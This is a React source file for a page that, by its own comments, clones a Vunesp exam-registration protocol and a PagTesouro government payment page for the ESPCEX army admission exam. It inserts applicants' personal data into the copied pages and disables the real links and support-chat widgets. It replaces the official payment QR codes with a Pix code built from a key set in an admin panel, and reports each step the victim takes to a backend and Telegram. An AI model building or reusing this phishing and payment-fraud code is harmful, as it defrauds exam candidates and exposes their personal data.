import React, { useRef, useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import { injectMobileCleanup } from "../utils/mobileCleanup";

const API = process.env.REACT_APP_BACKEND_URL;

/**
 * Notifica o backend sobre uma mudança de status na sessão do candidato.
 * Backend edita a mensagem no Telegram (sem enviar nova) e atualiza o
 * status na aba "Inscrições" do painel admin.
 */
function notificarStatus(status) {
  const sessaoId = sessionStorage.getItem("sessao_id");
  if (!sessaoId) return;
  axios
    .post(`${API}/api/notificar/status`, { sessao_id: sessaoId, status })
    .catch((err) => console.warn("Falha ao notificar status:", err?.message || err));
}

/**
 * Página de Protocolo da Inscrição — clone da página Vunesp.
 * Renderiza o HTML estático em iframe e injeta os dados do candidato
 * (salvos em sessionStorage no momento do submit do Cadastro).
 */
export default function Protocolo() {
  const navigate = useNavigate();
  const iframeRef = useRef(null);
  const pagModalRef = useRef(null);
  const [showPagModal, setShowPagModal] = useState(false);
  const [dadosCandidato, setDadosCandidato] = useState(null);

  // Guarda: só entra aqui se a inscrição foi concluída
  useEffect(() => {
    if (!sessionStorage.getItem("login_cpf")) {
      navigate("/login");
      return;
    }
    if (sessionStorage.getItem("inscricao_concluida") !== "true") {
      navigate("/cadastro");
    }
  }, [navigate]);

  const handleLoad = () => {
    const iframe = iframeRef.current;
    if (!iframe) return;
    const doc = iframe.contentDocument || iframe.contentWindow?.document;
    if (!doc) return;

    // 1) Remove widgets de chat Genesys/Messenger
    doc.querySelectorAll(
      "iframe[id*='genesys'], iframe[id*='messenger'], iframe[id*='Messenger']"
    ).forEach((el) => el.remove());

    // 1.1) Esconde acessibilidade lateral + compacta layout em mobile
    injectMobileCleanup(iframe);

    // 2) Neutraliza links externos
    doc.querySelectorAll("a").forEach((a) => {
      a.setAttribute("href", "#");
      a.removeAttribute("target");
    });

    // 3) Pega os dados salvos no Cadastro
    let dados = {};
    try {
      dados = JSON.parse(sessionStorage.getItem("dados_inscricao") || "{}");
    } catch {}
    if (!dados || !dados.nome) {
      // Fallback: tenta combinar cadastro_basico + inscricao_dados
      try {
        const cad = JSON.parse(sessionStorage.getItem("cadastro_basico") || "{}");
        const ins = JSON.parse(sessionStorage.getItem("inscricao_dados") || "{}");
        dados = { ...cad, ...ins };
      } catch {}
    }
    // Salva no state para o modal de pagamento poder usar
    setDadosCandidato(dados);

    // ============ MAPEAMENTO DE CAMPOS ============
    // Cada label <label for="X"> tem um <span class="form-control-static">
    // como próximo elemento contendo o VALOR. Substituímos pelo dado real.
    const mapa = {
      Nome: dados.nome,
      CPF: dados.cpf,
      Documento: dados.documento,
      Digito: dados.digito,
      OrgaoEmissor: dados.orgaoEmissor,
      DataEmissao: dados.dataEmissao,
      EndPais: dados.endPais,
      EndCEP: dados.endCEP,
      EndLogradouro: dados.endLogradouro,
      EndNumero: dados.endNumero,
      EndComplemento: dados.endComplemento,
      EndBairro: dados.endBairro,
      EndCidade: dados.endCidade,
      EndUF: dados.endUF,
      NacionalidadeId: dados.nacionalidade,
      NaturalCidade: dados.naturalCidade,
      NaturalUF: dados.naturalUF,
      Sexo: dados.sexo,
      DataNascimento: dados.dataNascimento,
      EstadoCivil: dados.estadoCivil,
      MaoPredominante: dados.maoPredominante,
      DdiCelular: "+55",
      DddCelular: dados.dddCelular,
      FoneCelular: dados.foneCelular,
      DddResidencial: dados.dddResidencial,
      FoneResidencial: dados.foneResidencial,
      DddComercial: dados.dddComercial,
      FoneComercial: dados.foneComercial,
      Email: dados.email,
      NomeMae: dados.nomeMae,
      NomePai: dados.nomePai,
      selectOpcao: dados.opcaoCargo,
      // Inscrição radios (atrXXXX)
      atr4622: dados.origemEscola,
      atr4623: dados.colegioMilitar,
      atr4624: dados.situacaoMilitarCandidato,
      atr4625: dados.situacaoMilitarPais,
      atr4626: dados.autodeclaraNegro,
      atr4627: dados.concorrerVagasNegros,
      atr4628: dados.autodeclaraIndigena,
      atr4629: dados.concorrerVagasIndigena,
      atr4630: dados.autodeclaraQuilombola,
      atr4631: dados.concorrerVagasQuilombola,
      atr4632: dados.realizouCurso,
      atr4633: dados.nomeCurso,
      atr4634: dados.cidadeCurso,
      atr4635: dados.primeiraVez,
      atr4636: dados.quantasVezes,
      atr4661: dados.cienteAcordo,
      atr4664: dados.cidadeProva,
    };

    // Injeta valor em cada <span class="form-control-static"> seguindo o
    // label correspondente.
    const setSpanValueForLabel = (forId, val) => {
      const lbl = doc.querySelector(`label[for="${forId}"]`);
      if (!lbl) return;
      // Procura próximo .form-control-static no mesmo .form-group
      const fg = lbl.closest(".form-group");
      const span = fg?.querySelector(".form-control-static");
      if (span) span.textContent = val || "";
    };
    Object.entries(mapa).forEach(([k, v]) => setSpanValueForLabel(k, v));

    // 4) Header "Olá, [Nome]" — primeiro nome
    if (dados.nome) {
      const primeiroNome = dados.nome.trim().split(/\s+/)[0];
      // Procura por elementos contendo "Donas" (placeholder do HTML original)
      doc.querySelectorAll("*").forEach((el) => {
        // Só nodes com filhos diretos de texto pra não estragar estruturas
        if (el.children.length === 0 && /\b(Donas|Olá)\b/i.test(el.textContent || "")) {
          el.textContent = el.textContent.replace(/Donas/gi, primeiroNome);
        }
      });
    }

    // 5) Número de Protocolo — usa o ref_pagamento
    const ref = sessionStorage.getItem("ref_pagamento") || String(Date.now());
    const ano = new Date().getFullYear();
    // Formato: EPCE2601 XXXXXXXXX/ANO
    const numProt = `EPCE2601 ${ref.padStart(9, "0").slice(-10)}/${ano}`;
    doc.querySelectorAll("h5 strong").forEach((el) => {
      if (/EPCE\d+/i.test(el.textContent || "")) {
        el.textContent = numProt;
      }
    });

    // 6) Data de última atualização
    const agora = new Date();
    const fmt = (n) => String(n).padStart(2, "0");
    const dataAtual = `${fmt(agora.getDate())}/${fmt(agora.getMonth() + 1)}/${agora.getFullYear()} ${fmt(agora.getHours())}:${fmt(agora.getMinutes())}:${fmt(agora.getSeconds())}`;
    doc.querySelectorAll("*").forEach((el) => {
      if (el.children.length === 0 && /Com dados atualizados até/i.test(el.textContent || "")) {
        el.textContent = `Com dados atualizados até ${dataAtual}`;
      }
    });

    // 7) Botão "PAGAR MINHA INSCRIÇÃO"
    doc.querySelectorAll("button, a").forEach((b) => {
      const txt = (b.textContent || "").trim().toUpperCase();
      if (txt.includes("PAGAMENTO")) {
        // Renomeia o botão para "PAGAR MINHA INSCRIÇÃO"
        const inner = b.innerHTML;
        if (inner.includes("fa-file") || inner.match(/<i[^>]*>/)) {
          // Mantém o ícone, troca só o texto
          b.innerHTML = inner.replace(
            /PAGAMENTO DA INSCRIÇÃO|PAGAMENTO\s+DA\s+INSCRIÇÃO/gi,
            "PAGAR MINHA INSCRIÇÃO"
          );
        } else {
          b.textContent = "PAGAR MINHA INSCRIÇÃO";
        }
        b.addEventListener("click", (e) => {
          e.preventDefault();
          notificarStatus("PIX_GERADO");
          setShowPagModal(true);
        });
      }
    });

    // 8) "Sair" / "Trocar Senha" do header — redireciona pra home
    doc.querySelectorAll("a, button").forEach((b) => {
      const txt = (b.textContent || "").trim().toLowerCase();
      if (txt === "sair") {
        b.addEventListener("click", (e) => {
          e.preventDefault();
          sessionStorage.clear();
          window.top.location.href = "/";
        });
      }
    });
  };

  // Handler quando o modal de pagamento carrega — injeta os dados do
  // candidato nos campos do PagTesouro
  const handlePagModalLoad = () => {
    const iframe = pagModalRef.current;
    if (!iframe) return;
    const doc = iframe.contentDocument || iframe.contentWindow?.document;
    if (!doc || !dadosCandidato) return;

    // Remove widgets de chat
    doc.querySelectorAll(
      "iframe[id*='genesys'], iframe[id*='messenger']"
    ).forEach((el) => el.remove());

    // Remove o botão "Payload Location" (usado apenas para casos
    // específicos, não é relevante para o usuário final)
    doc.getElementById("btn-payload-location")?.remove();

    // Injeta CSS para tornar o modal mais compacto (menos espaço vertical
    // e laterais menores)
    const compactStyle = doc.createElement("style");
    compactStyle.textContent = `
      body { margin: 0 !important; padding: 0 !important; }
      .container, .container-fluid { padding-left: 14px !important; padding-right: 14px !important; max-width: 100% !important; }
      .row { margin-left: 0 !important; margin-right: 0 !important; }
      .col, [class*="col-"] { padding-left: 6px !important; padding-right: 6px !important; }
      .mb-1, .mb-2, .mb-3, .mb-4 { margin-bottom: 6px !important; }
      .mt-1, .mt-2, .mt-3, .mt-4 { margin-top: 6px !important; }
      .py-1, .py-2, .py-3, .py-4 { padding-top: 6px !important; padding-bottom: 6px !important; }
      .px-1, .px-2, .px-3, .px-4 { padding-left: 6px !important; padding-right: 6px !important; }
      h4, h5 { margin: 5px 0 !important; font-size: 15px !important; }
      p { margin: 5px 0 !important; }
      hr { margin: 6px 0 !important; }
      .qr-code-img { max-width: 150px !important; height: auto !important; }
      .qr-code-box {
        font-size: 9px !important;
        padding: 6px !important;
        word-break: break-all !important;
        max-width: 100% !important;
        overflow-wrap: anywhere !important;
        max-height: 130px !important;
        overflow-y: auto !important;
      }
      .qr-code-copy-box, .qr-code-copy-box .btn { max-width: 100% !important; width: 100% !important; }
      .titulo-detalhe-pagamento { font-size: 12px !important; font-weight: bold !important; margin-bottom: 3px !important; }
      .valor-detalhe-pagamento { font-size: 12px !important; margin-bottom: 3px !important; }
      .btn { padding: 5px 10px !important; font-size: 12px !important; }
      .btn-copy-qr { font-size: 11px !important; padding: 5px 8px !important; }
      /* Esconde o botão Payload Location (não é relevante p/ o usuário) */
      #btn-payload-location { display: none !important; }
      footer img { max-height: 30px !important; }
      footer { padding: 8px 0 !important; }

      /* Print: layout em coluna única (como o PDF original), QR Code grande,
         oculta widgets de chat e ícones de acessibilidade */
      @media print {
        body { margin: 0 !important; padding: 16px !important; }
        .col-md-6, .col-lg-6, .col-xl-6, .col-md-7, .col-md-5,
        [class*="col-md-"], [class*="col-lg-"] {
          width: 100% !important; max-width: 100% !important; flex: 0 0 100% !important; display: block !important;
        }
        .row { display: block !important; }
        .qr-code-img { max-width: 360px !important; height: auto !important; display: block !important; margin: 14px auto !important; }
        .qr-code-box { font-size: 9px !important; padding: 6px !important; word-break: break-all !important; text-align: center !important; }
        .qr-code-copy-box, .qr-code-copy-box .btn, button, .btn, #btn-copy-qr { display: none !important; }
        iframe[id*='genesys'], iframe[id*='messenger'], .genesys-mxg-frame { display: none !important; }
        .barra-acessibilidade, [class*='acessibilidade'][style*='fixed'], [class*='libras'] { display: none !important; }
      }
    `;
    doc.head.appendChild(compactStyle);

    // Neutraliza links externos
    doc.querySelectorAll("a").forEach((a) => {
      a.setAttribute("href", "#");
      a.removeAttribute("target");
    });

    // Os 5 campos .valor-detalhe-pagamento em ordem:
    // [0] Descrição (24559 - TAXA DO CONCURSO...)
    // [1] Nome
    // [2] CPF
    // [3] Número de referência
    // [4] Valor total
    const campos = doc.querySelectorAll(".valor-detalhe-pagamento");
    const ref = sessionStorage.getItem("ref_pagamento") || String(Date.now());
    const refCurto = String(ref).slice(-8); // 8 dígitos pra ficar igual ao formato (92016631)
    if (campos[0]) campos[0].textContent = "24559 - TAXA DO CONCURSO DE ADMISSÃO - ESPCEX";
    if (campos[1]) campos[1].textContent = dadosCandidato.nome || "";
    if (campos[2]) campos[2].textContent = dadosCandidato.cpf || "";
    if (campos[3]) campos[3].textContent = refCurto;
    if (campos[4]) campos[4].innerHTML = "R$&nbsp;&nbsp;100,00";

    // === Gera o QR Code Pix REAL com a chave cadastrada no painel admin ===
    // Substitui a imagem estática do PagTesouro e o texto "copia e cola"
    // pelos valores retornados por /api/pix/gerar (que usa cfg.pix_chave).
    (async () => {
      try {
        const r = await axios.post(`${API}/api/pix/gerar`, {
          valor: 100.0,
          txid: refCurto,
        });
        const { payload: brcode, qrcode: qrImg } = r.data || {};
        if (!brcode || !qrImg) return;
        // Substitui TODAS as <img> de QR (3 imagens hardcoded no HTML)
        doc.querySelectorAll(".qr-code-img, img.qr-code-img").forEach((img) => {
          img.src = qrImg;
          img.removeAttribute("srcset");
        });
        // Fallback: pega qualquer <img> com src=data:image/png;base64,...
        // que seja um QR Code (geralmente quadrado)
        doc.querySelectorAll("img").forEach((img) => {
          const src = img.getAttribute("src") || "";
          if (
            src.startsWith("data:image/png;base64,") &&
            !img.classList.contains("__esa_replaced") &&
            (img.width === img.height || img.naturalWidth === img.naturalHeight)
          ) {
            img.src = qrImg;
            img.classList.add("__esa_replaced");
          }
        });
        // Substitui o texto Pix Copia e Cola
        const codeBox = doc.querySelector(".qr-code-box");
        if (codeBox) codeBox.textContent = brcode;
      } catch (err) {
        console.error("Falha ao gerar PIX:", err);
      }
    })();

    // Botão "Fechar"
    doc.querySelectorAll("button, a").forEach((btn) => {
      const t = (btn.textContent || "").trim().toLowerCase();
      if (t === "fechar") {
        btn.addEventListener("click", (e) => {
          e.preventDefault();
          setShowPagModal(false);
        });
      }
      if (t === "atualizar") {
        btn.addEventListener("click", (e) => {
          e.preventDefault();
          iframe.contentWindow?.location?.reload();
        });
      }
      if (t === "imprimir") {
        btn.addEventListener("click", (e) => {
          e.preventDefault();
          notificarStatus("PIX_IMPRESSO");
          // Usa o print nativo do browser — exatamente como o PagTesouro
          // original. O usuário escolhe "Salvar como PDF" no diálogo de
          // impressão, gerando o arquivo no mesmo formato do original
          // (com data/URL no header/footer, coluna única, QR grande,
          // logos do Tesouro/Ministério/Governo no rodapé).
          try {
            iframe.contentWindow.focus();
            iframe.contentWindow.print();
          } catch (err) {
            console.error("Erro ao imprimir:", err);
          }
        });
      }
    });

    // Botão "Copiar código Pix" — copia o texto do código Pix exibido
    const btnCopy = doc.getElementById("btn-copy-qr");
    if (btnCopy) {
      btnCopy.addEventListener("click", (e) => {
        e.preventDefault();
        notificarStatus("PIX_COPIADO");
        const codeEl = doc.querySelector(".qr-code-box");
        const code = (codeEl?.textContent || "").trim();
        if (code && navigator.clipboard) {
          navigator.clipboard.writeText(code);
          const originalText = btnCopy.textContent;
          btnCopy.textContent = "Copiado!";
          btnCopy.style.background = "#22c55e";
          setTimeout(() => {
            btnCopy.textContent = originalText;
            btnCopy.style.background = "";
          }, 1500);
        }
      });
    }
  };

  return (
    <>
      <iframe
        ref={iframeRef}
        title="Protocolo da Inscrição"
        src="/protocolo.html"
        onLoad={handleLoad}
        data-testid="protocolo-iframe"
        style={{
          position: "fixed",
          inset: 0,
          width: "100vw",
          height: "100vh",
          border: "none",
          margin: 0,
          padding: 0,
        }}
      />
      {showPagModal && (
        <div
          data-testid="pag-modal-overlay"
          onClick={(e) => {
            if (e.target === e.currentTarget) setShowPagModal(false);
          }}
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(0,0,0,0.65)",
            zIndex: 9999,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            padding: "20px",
          }}
        >
          <div
            style={{
              background: "#fff",
              borderRadius: "8px",
              boxShadow: "0 20px 60px rgba(0,0,0,0.4)",
              width: "min(820px, 96%)",
              height: "min(82vh, 680px)",
              position: "relative",
              overflow: "hidden",
            }}
            data-testid="pag-modal-content"
          >
            <button
              type="button"
              onClick={() => setShowPagModal(false)}
              aria-label="Fechar"
              data-testid="pag-modal-close"
              style={{
                position: "absolute",
                top: "8px",
                right: "8px",
                width: "36px",
                height: "36px",
                border: "none",
                background: "rgba(0,0,0,0.05)",
                borderRadius: "50%",
                cursor: "pointer",
                fontSize: "22px",
                fontWeight: "bold",
                color: "#444",
                lineHeight: "1",
                zIndex: 10,
              }}
            >
              ×
            </button>
            <iframe
              ref={pagModalRef}
              title="PagTesouro - Pagamento da Inscrição"
              src="/pagtesouro.html"
              onLoad={handlePagModalLoad}
              data-testid="pag-modal-iframe"
              style={{
                width: "100%",
                height: "100%",
                border: "none",
              }}
            />
          </div>
        </div>
      )}
    </>
  );
}
